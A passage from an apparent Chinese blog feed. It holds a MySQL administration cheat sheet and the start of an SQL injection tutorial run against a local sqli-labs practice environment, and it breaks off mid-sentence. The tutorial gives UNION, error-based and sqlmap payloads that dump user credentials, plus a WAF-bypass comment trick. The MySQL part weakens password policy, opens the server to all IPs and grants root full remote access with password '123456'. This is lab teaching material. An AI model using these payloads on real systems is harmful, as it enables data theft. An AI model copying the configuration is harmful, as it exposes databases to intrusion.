class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW STATUS;</span><br></pre></td></tr></table></figure><p>服务器配置变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES;</span><br></pre></td></tr></table></figure><h2 id="用户相关命令"><a href="#用户相关命令" class="headerlink" title="用户相关命令"></a>用户相关命令</h2><p>（1）创建用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;name&#39;@&#39;host&#39; identified by &#39;password&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sWatwF4vhOJYTNA.png" alt="image-20201112171427748"></p><p>（2）删除用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user name@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/oe5ZK9Fv1qEkCAQ.png" alt="image-20201112171814162"></p><p>（3）为用户授权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant some_privileges on *.* to &#39;name&#39;@&#39;host&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fy1be78PohEBaL5.png" alt="image-20201112172854469"></p><p>查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;wyw&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/D6eKVu1wSGP3IvT.png" alt="image-20201112173201025"></p><p>（4）撤销用户权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke some_privileges to *.* from &#39;name&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qmYS8la1EuW27iB.png" alt="image-20201112174611837"></p><p>查看</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/9MGbYT5ym1ASae3.png" alt="image-20201112174719182"></p><h2 id="库相关命令"><a href="#库相关命令" class="headerlink" title="库相关命令"></a>库相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><hr><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE db_name;</span><br></pre></td></tr></table></figure><p>（3）查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><p>（4）打开数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE db_name;</span><br></pre></td></tr></table></figure><p>（5）查看当前所在数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br></pre></td></tr></table></figure><h2 id="表相关命令"><a href="#表相关命令" class="headerlink" title="表相关命令"></a>表相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name(</span><br><span class="line">column_name data_type,</span><br><span class="line">......</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>// []中内容可省略。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user(</span><br><span class="line">uid INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">username VARCHAR(30) NOT NULL,</span><br><span class="line">pwd CHAR(32) NOT NULL,</span><br><span class="line">pic CHAR(40) NOT NULL DEFAULT &#39;a.jpg&#39;,</span><br><span class="line">money DECIMAL(8,2),</span><br><span class="line">content TEXT,</span><br><span class="line">sex ENUM(&#39;male&#39;,&#39;female&#39;,&#39;secret&#39;),</span><br><span class="line">age TINYINT UNSIGNED NOT NULL DEFAULT &#39;18&#39;</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name;</span><br></pre></td></tr></table></figure><p>（3）改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name RENAME new_tab_name;</span><br></pre></td></tr></table></figure><p>（4）查</p><p>查看表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES[FROM db_name];</span><br></pre></td></tr></table></figure><p>查看数据表结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC table_name;   </span><br></pre></td></tr></table></figure><h2 id="字段相关命令"><a href="#字段相关命令" class="headerlink" title="字段相关命令"></a>字段相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD (col_name col_definition,...);</span><br></pre></td></tr></table></figure><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name,DROP col_name,...;</span><br></pre></td></tr></table></figure><p>（3）改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name MODIFY col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name CHANGE old_col_name new_col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><h2 id="数据相关命令"><a href="#数据相关命令" class="headerlink" title="数据相关命令"></a>数据相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(column_name,...)</span><br><span class="line">VALUES(&#39;&#39;,&#39;&#39;,...)，(&#39;&#39;,&#39;&#39;,...),...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name SET col_name&#x3D;expr,...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(col_name) SELECT col_name FROM table_reference;</span><br></pre></td></tr></table></figure><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><p>（3）改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET col_name1&#x3D;expr,col_name2&#x3D;expr,...[WHERE where_condition];</span><br></pre></td></tr></table></figure><p>（4）查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,... FROM table_name;</span><br></pre></td></tr></table></figure><p>查询结果分组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name GROUP BY col_name;</span><br></pre></td></tr></table></figure><p>查询结果排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name ORDER BY col_name ASC|DESC;</span><br></pre></td></tr></table></figure><p>限制查询结果返回数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name LIMIT row_count;</span><br></pre></td></tr></table></figure><p>（5）连接</p><p>mysql在SELECT,UPDATE,DELETE语句中支持JOIN操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_reference INNER|LEFT|RIGHT JOIN table_reference ON conditional_expr</span><br></pre></td></tr></table></figure><h1 id="密码设置与远程连接"><a href="#密码设置与远程连接" class="headerlink" title="密码设置与远程连接"></a>密码设置与远程连接</h1><h2 id="MySQL中为root用户设置密码"><a href="#MySQL中为root用户设置密码" class="headerlink" title="MySQL中为root用户设置密码"></a>MySQL中为root用户设置密码</h2><p>进入mysql后发现root用户密码为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/3AYLdpV4iGK6Bzu.png" alt="image-20201101233018450"></p><p>使用以下命令设置密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;新密码&#39; PASSWORD EXPIRE NEVER;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;新密码&#39;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>出现错误：</p><p><strong>ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</strong></p><p>查找资料：</p><p>原因是因为密码设置的过于简单会报错,MySQL有密码设置的规范</p><p>如果想要查看MySQL完整的初始密码规则,登陆后执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;validate_password%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZTkVwiKIoWrHGtb.png" alt="image-20201101235231684"></p><p>validate_password.length决定密码的长度,默认长度为8位，可以通过以下命令修改为4位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.length&#x3D;4;</span><br></pre></td></tr></table></figure><p>validate_password_policy决定密码的验证策略,默认等级为MEDIUM(中等),可以通过以下命令修改为LOW(低)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.policy&#x3D;0;</span><br></pre></td></tr></table></figure><p>修改完成后密码就可以设置的很简单。</p><p>再次设置密码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/PeC6lhpZ4gVNJG1.png" alt="image-20201101235825039"></p><p>成功!</p><p>退出后重新使用设置的密码进入MySQL</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Q8HoYIWZLOrpGmy.png" alt="image-20201101235949729"></p><p>再次查看用户及密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/VzMwpaEI18cnTbL.png" alt="image-20201102000107053"></p><p>完成!</p><h2 id="Navicat远程连接MySQL"><a href="#Navicat远程连接MySQL" class="headerlink" title="Navicat远程连接MySQL"></a>Navicat远程连接MySQL</h2><p>1)修改配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>查找到bind-address,将bind-address=127.0.0.1 修改为bind-address=0.0.0.0 ,以允许任何IP来访问MySQL服务</p><p>2）重启MySQL服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>3）给需要远程访问的用户授权</p><p>授权所有权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201118172547045.png" alt="image-20201118172547045"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.pianshen.com/article/251865160/">Linux下重置mysql8.0密码</a></p><p>[2] <a href="https://blog.csdn.net/calistom/article/details/87939956">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</a></p><p>​                 </p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="posts/20316.html"/>
      <url>posts/20316.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>SQL注入就是通过把SQL命令插入到 Web表单提交 或 URL 或 页面请求等的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。即：将构造的SQL语句插入到正常提交的字符串中，并使服务器将字符串中的命令解析为可执行命令而不是字符串。</p><p>SQL注入产生的原因：许多网页程序员在编写代码的时候，没有对用户输入数据的合法性进行严格的判断和过滤，从而导致应用程序存在该漏洞。</p><p>MySQL手工注入原理：主要是利用mysql自带的information_schema数据库，information_schema这个数据库保存了MySQL上所有数据库的信息。如有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema数据库里面。</p></blockquote><p>SQL注入练习环境：Sqlilabs</p><p><a href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a></p><h1 id="GET-Union注入"><a href="#GET-Union注入" class="headerlink" title="GET Union注入"></a>GET Union注入</h1><h2 id="手动测试"><a href="#手动测试" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.判断是否存在注入点</strong></p><p>通过在URL中修改对应的ID值，为正常数字，大数字，字符（单引号，双引号，双单引号，括号，反斜杆)来探测URL中是否存在注入点。</p><p>判断注入类型：</p><p>数字型注入：id=1 返回正常 –&gt; id=2-1 返回正常</p><p>字符型注入：id=1 返回正常 –&gt; id=1a 返回正常 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1    #正常显示</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203101671.png" alt="image-20201130203101671"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;   </span><br><span class="line">&#x2F;&#x2F;添加单引号后报错,猜测sql语句 SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231003746.png" alt="image-20201128231003746"></p><p><strong>2.添加注释（添加的单引号闭合前面的单引号，再用注释符注释掉后面内容）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--+        </span><br><span class="line">&#x2F;&#x2F;后面加上and &#39;1&#39;&#x3D;&#39;1 ,or &#39;1&#39;&#x3D;&#39;1 ,and &#39;1&#39; like &#39;1，or&#39; &#39;&#x3D;1&#x3D;&#39; 亦可，闭合单引号</span><br><span class="line">sql语句 SELECT * FROM users WHERE id&#x3D;&#39;1&#39;-- &#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231239638.png" alt="image-20201128231239638"></p><p>注释符：在Mysql中常见的注释符表达式：#(%23) 或–空 格或 /**/</p><p>内联注释： /*! SQL语句 */ 只有Mysql可以识别，常用来绕过WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4</span><br></pre></td></tr></table></figure><p><strong>3.判断字段数量(使用order by 对字段排序)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1--+  #对第一列排序，正常</span><br></pre></td></tr></table></figure><p>……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4--+  #对第四列排序，报错，表明没有第四列</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231715638.png" alt="image-20201128231715638"></p><p>即有3个字段</p><p><strong>4.报显示位，id设为查询不到的数据（使用union联合查询，前后的表中要有相同的字段数，然后让左边查询无结果，右边有结果）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128232240296.png" alt="image-20201128232240296"></p><p><strong>5.查询相关信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3--+  #查询当前数据库</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128233025336.png" alt="image-20201128233025336"></p><p>其他信息 user(),version()…</p><p><strong>6.查询具体信息</strong></p><p>1）查询所有库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234024839.png" alt="image-20201128234024839"></p><p>2）查询当前库的所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234247143.png" alt="image-20201128234247143"></p><p>3）查询表中字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure><p>引号内 users 转换为十六进制亦可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234755093.png" alt="image-20201128234755093"></p><p><strong>7.查询数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(id,0x3a,password,0x3a,username),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128235121970.png" alt="image-20201128235121970"></p><p><strong>8.查询基本信息</strong></p><p>查询基本信息主要是利用数据库中的内置函数来获取信息。</p><ul><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ul><h2 id="利用Sqlmap测试"><a href="#利用Sqlmap测试" class="headerlink" title="利用Sqlmap测试"></a><strong>利用Sqlmap测试</strong></h2><p>Sqlmap是检测和利用SQL注入漏洞的一款强大工具。</p><p><strong>1.查询库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129153523160.png" alt="image-20201129153523160"></p><p><strong>2.查询表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154040322.png" alt="image-20201129154040322"></p><p><strong>3.查询字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154015859.png" alt="image-20201129154015859"></p><p><strong>4.查询数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154914063.png" alt="image-20201129154914063"></p><p><strong>Sqlmap检测过程中的payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 6535&#x3D;6535 AND &#39;MMEg&#39;&#x3D;&#39;MMEg</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND EXTRACTVALUE(6529,CONCAT(0x5c,0x7162717a71,(SELECT (ELT(6529&#x3D;6529,1))),0x7176767a71)) AND &#39;SxoL&#39;&#x3D;&#39;SxoL</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 9353 FROM (SELECT(SLEEP(5)))yGeE) AND &#39;aMBL&#39;&#x3D;&#39;aMBL</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-3115&#39; UNION ALL SELECT NULL,CONCAT(0x7162717a71,0x7372786d534b54684f795a787a4e736962676675516963714d7759496751777a4b41614f57426376,0x7176767a71),NULL-- -</span><br></pre></td></tr></table></figure><h1 id="GET-报错注入"><a href="#GET-报错注入" class="headerlink" title="GET 报错注入"></a>GET 报错注入</h1><p>在没有数据回显的时候，通过报错来显示具体的信息</p><p>1.<strong>floor()函数</strong></p><p>原理：<a href="https://blog.csdn.net/shuteer_xu/article/details/104438405">Mysql报错注入之函数分析</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">注入公式（Payload为自己想获取内容的脚本）：</span><br><span class="line">and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">and(select 1 from (select count(*),concat(concat(database(),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;暴库</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot; limit 3,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询表</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;security&quot; and table_name&#x3D;&quot;users&quot; limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询字段</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询字段内容</span><br></pre></td></tr></table></figure><p>2.<strong>extractvalue()函数</strong></p><p>extractvalue(目标xml文档，xml路径) :对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 